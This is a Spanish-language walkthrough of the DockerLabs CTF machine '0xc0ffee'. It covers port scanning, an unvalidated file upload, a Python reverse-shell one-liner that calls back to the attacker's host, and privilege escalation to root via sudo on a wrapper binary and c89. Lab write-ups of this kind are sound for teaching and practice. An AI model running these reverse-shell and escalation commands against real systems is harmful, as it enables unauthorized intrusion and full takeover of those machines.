## Introducción

Este documento presenta la resolución completa de la máquina **0xc0ffee**, desarrollada por *d1se0* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone dos servicios HTTP: uno en el puerto 80 con un formulario que requiere una palabra clave, y otro en el puerto 7777 que expone directorios públicos. A través de este último, se extrae un archivo `history.txt` que contiene la palabra clave necesaria para acceder a una interfaz de configuración.
Esta interfaz permite subir y ejecutar archivos sin validación, facilitando la subida de un script Python malicioso para obtener una reverse shell como `www-data`. Una vez dentro, se encadenan múltiples configuraciones inseguras: se obtienen contraseñas de otros usuarios mediante adivinanzas, se abusa de un binario personalizado (`code`) para leer archivos sensibles, y finalmente se explota `c89` con sudo para obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip 0xc0ffee.zip
sudo bash auto_deploy.sh 0xc0ffee.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p 0xc0ffee/{content,exploits,nmap,scripts}
cd 0xc0ffee
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **80/tcp** — HTTP
* **7777/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1764975256/Ports_ci5uip.png)

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p80,7777 172.17.0.2 -oN targeted
```

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Acceso a securepage

Se ingresa la palabra clave en el formulario del puerto 80, accediendo a **securepage**:

![SecurePage](https://res.cloudinary.com/dewqswzke/image/upload/v1764975258/SecurePage_ddzzrj.png)

La interfaz permite:
- Enviar un *Configuration Identifier* (nombre del archivo).
- Enviar *Configuration Data* (contenido del archivo).
- Cargar archivos existentes.

No existe sanitización, permitiendo **subida y ejecución arbitraria de archivos**.

### 2.2 Subida de payload

Se sube un archivo `shell.py` con el siguiente contenido:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

### 2.3 Reverse shell

Se inicia un listener en la máquina atacante:

```bash
nc -nlvp 443
```

Se carga el archivo desde la interfaz, ejecutando el script y obteniendo la reverse shell:

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1764975256/ReverseShell_pyksbr.png)

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → codebad

Se encuentra el archivo `/home/codebad/secret` con una adivinanza:

![Secret](https://res.cloudinary.com/dewqswzke/image/upload/v1764975192/Adivinanza_y7zjlu.png)

La respuesta es la contraseña del usuario `codebad`:

```bash
su codebad
```

![Codebad](https://res.cloudinary.com/dewqswzke/image/upload/v1764975193/Codebad_y27lwt.png)

### 3.2 De codebad → metadata

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l codebad](https://res.cloudinary.com/dewqswzke/image/upload/v1764975259/Sudo-lCodebad_dwy2vu.png)

Se puede ejecutar el binario `code` como `metadata`. Este binario es un wrapper de `ls`.

Se enumeran archivos de `metadata`:

```bash
find / -user metadata 2>/dev/null
```

![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1764975194/Find_qhm98g.png)

Se usa el wrapper para leer `/usr/local/bin`:

```bash
sudo -u metadata /home/codebad/code "/usr/local/bin"
```

![Code](https://res.cloudinary.com/dewqswzke/image/upload/v1764975192/Code_qgayyl.png)

Se obtiene la contraseña de `metadata`:

```bash
su metadata
```

![Metadata](https://res.cloudinary.com/dewqswzke/image/upload/v1764975250/Metadata_ny0073.png)

### 3.3 De metadata → root

Se verifican los permisos sudo de `metadata`:

```bash
sudo -l
```

![Sudo -l metadata](https://res.cloudinary.com/dewqswzke/image/upload/v1764975260/Sudo-lMetadata_q1cpfl.png)

Se puede ejecutar `c89` como root.

Se utiliza `searchbins` para verificar la técnica en GTFOBins:

```bash
searchbins -b c89 -f sudo
```

Se ejecuta:

```bash
sudo c89 -wrapper /bin/bash,-s .
```

Se obtiene una shell privilegiada:

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1764975258/Root_yuzqxb.png)
